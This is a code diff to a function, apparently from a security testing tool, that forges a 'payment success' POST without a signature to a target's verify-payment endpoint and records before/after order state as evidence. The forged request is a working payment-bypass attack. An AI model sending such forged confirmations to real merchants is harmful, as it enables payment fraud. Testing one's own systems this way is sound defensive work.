@@ -11,10 +11,13 @@ export async function fakePaymentSuccess(
   targetUrl: string,
   orderId: string,
 ): Promise<AttackResult> {
+  const before = await readOrderState(targetUrl, orderId);
+
+  const requestBody = JSON.stringify({ status: "success", orderId });
   const res = await fetch(`${targetUrl}/api/verify-payment`, {
     method: "POST",
     headers: { "content-type": "application/json" },
-    body: JSON.stringify({ status: "success", orderId }),
+    body: requestBody,
   });
   const httpStatus = res.status;
   let responseBody = "";
@@ -37,5 +40,22 @@ export async function fakePaymentSuccess(
     details,
     httpStatus,
     targetUrl,
+    evidence: {
+      exchanges: [
+        {
+          label: "Unsigned POST",
+          method: "POST",
+          path: "/api/verify-payment",
+          headers: { "(no signature)": "—" },
+          body: requestBody,
+          responseStatus: httpStatus,
+          responseBody,
+        },
+      ],
+      stateTrail: [
+        { label: "before", status: before.status, creditedRupees: before.creditedAmountRupees },
+        { label: "after", status: state.status, creditedRupees: state.creditedAmountRupees },
+      ],
+    },
   };
 }
